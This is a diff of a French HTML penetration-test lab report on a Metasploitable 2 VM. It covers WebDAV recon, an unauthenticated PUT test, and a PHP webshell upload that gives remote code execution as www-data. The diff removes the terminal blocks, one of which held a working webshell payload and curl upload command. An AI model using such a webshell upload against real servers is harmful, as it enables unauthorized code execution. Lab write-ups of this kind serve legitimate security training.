@@ -33,22 +33,16 @@
   <figure class="capture" id="cap-recon">
     <img src="../images/ms2-web/01-recon-nmap.png" alt="Scan nmap du port 80 et liste des applications">
     <figcaption>
-      <strong class="idx">1.</strong>
+      <strong class="idx">a.</strong>
       <span class="desc"><code>nmap -sV -p 80</code> révèle <code>Apache httpd 2.2.8 (Ubuntu)
       DAV/2</code> (module WebDAV actif) ; la page d'accueil liste <code>/dav/</code> parmi les
       applications.</span>
-      <span class="fname">images/ms2-web/01-recon-nmap.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">2. Test d'écriture WebDAV (méthode PUT)</h2>
   <p>On vérifie si le serveur accepte l'écriture de fichiers dans <code>/dav/</code> sans
   authentification :</p>
-
-  <pre class="terminal">$ curl -X PUT http://192.168.56.101/dav/josatest.txt --data "hello-josa"
-   ... 201 Created
-$ curl http://192.168.56.101/dav/josatest.txt
-hello-josa</pre>
 
   <p>Le code <strong><code>201 Created</code></strong> et la relecture du fichier confirment
   que <code>PUT</code> est autorisé <strong>sans authentification</strong>. Si PHP s'exécute
@@ -57,23 +51,15 @@ hello-josa</pre>
   <figure class="capture" id="cap-put">
     <img src="../images/ms2-web/02-put-test.png" alt="Test PUT WebDAV réussi">
     <figcaption>
-      <strong class="idx">2.</strong>
+      <strong class="idx">b.</strong>
       <span class="desc">Dépôt d'un fichier texte par <code>PUT</code> (<code>201 Created</code>)
       puis relecture (<code>hello-josa</code>) : l'écriture WebDAV est ouverte.</span>
-      <span class="fname">images/ms2-web/02-put-test.png</span>
     </figcaption>
   </figure>
 
   <h2 class="section">3. Démarche d'exploitation — webshell PHP</h2>
   <p>On dépose un webshell PHP minimal qui exécute la commande passée dans le paramètre
   <code>c</code>, puis on l'appelle :</p>
-
-  <pre class="terminal">$ printf '&lt;?php system($_GET["c"]); ?&gt;' | curl -X PUT http://192.168.56.101/dav/j.php --data-binary @-
-   ... 201 Created
-$ curl "http://192.168.56.101/dav/j.php?c=id;uname%20-a;hostname"
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
-metasploitable</pre>
 
   <blockquote class="evidence">
     Le fichier <code>.php</code> déposé par WebDAV est interprété par PHP &mdash; exécution de
@@ -84,11 +70,10 @@ metasploitable</pre>
   <figure class="capture" id="cap-rce">
     <img src="../images/ms2-web/03-webshell-rce.png" alt="Webshell PHP exécutant id, uid=33 www-data">
     <figcaption>
-      <strong class="idx">3.</strong>
+      <strong class="idx">c.</strong>
       <span class="desc">Dépôt du webshell (<code>201</code>) puis exécution de
       <code>id;uname -a;hostname</code> : réponse <code>uid=33(www-data)</code> — preuve de
       l'exécution de code à distance (RCE).</span>
-      <span class="fname">images/ms2-web/03-webshell-rce.png</span>
     </figcaption>
   </figure>
 
@@ -102,10 +87,9 @@ metasploitable</pre>
   <figure class="capture" id="cap-cleanup">
     <img src="../images/ms2-web/04-cleanup.png" alt="Suppression des fichiers déposés via DELETE">
     <figcaption>
-      <strong class="idx">4.</strong>
+      <strong class="idx">d.</strong>
       <span class="desc">Nettoyage : <code>DELETE</code> du webshell et du fichier de test
       (<code>204 No Content</code>).</span>
-      <span class="fname">images/ms2-web/04-cleanup.png</span>
     </figcaption>
   </figure>
 
